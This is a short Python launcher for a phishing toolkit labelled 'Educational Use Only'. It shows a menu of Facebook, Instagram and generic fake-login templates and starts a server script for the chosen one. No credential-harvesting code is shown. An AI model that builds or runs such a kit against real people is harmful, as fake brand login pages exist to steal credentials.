import os

def banner():
    print(r"""
  ███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ 
  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔══██╗
  ███████╗███████║███████║██████╔╝██████╔╝██╔████╔██║███████║
  ╚════██║██╔══██║██╔══██║██╔═══╝ ██╔═══╝ ██║╚██╔╝██║██╔══██║
  ███████║██║  ██║██║  ██║██║     ██║     ██║ ╚═╝ ██║██║  ██║
  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝

        ( S  H  A  R  M  A )  |  Tool by Piyush 💻
    --------------------------------------------------
         Educational Use Only | Simulated Phishing Toolkit
    """)

def main():
    banner()
    print("[1] Facebook")
    print("[2] Instagram")
    print("[3] Simple Fake Login")
    print("[0] Exit")

    choice = input(">> Choose a template: ").strip()

    site_map = {
        "1": "facebook",
        "2": "instagram",
        "3": "fake_login"
    }

    if choice == "0":
        print("[!] Exiting...")
        return
    elif choice in site_map:
        site = site_map[choice]
        print(f"\n[+] Starting template: {site}")
        os.system(f"./start_server.sh {site}")
    else:
        print("[-] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()

